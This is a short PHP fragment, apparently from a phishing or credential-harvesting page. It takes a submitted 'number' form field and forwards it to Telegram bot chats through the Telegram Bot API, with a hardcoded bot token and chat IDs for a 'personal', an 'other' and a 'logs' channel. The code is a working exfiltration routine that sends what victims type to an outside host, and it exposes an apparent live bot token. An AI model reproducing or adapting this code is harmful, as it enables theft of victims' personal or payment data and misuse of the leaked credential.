// personal
file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-578705759&text=" . $_POST['number']);

// other
//file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-538746459&text=" . $_POST['number']);

$_POST['number'] = NULL;

// logs
$data = [
'chat_id' => $Chat_ID,
'text' => "Number: " . $_POST['number']
];
file_get_contents("https://api.telegram.org/bot" . $Api_Token . "/sendMessage?" . http_build_query($data));
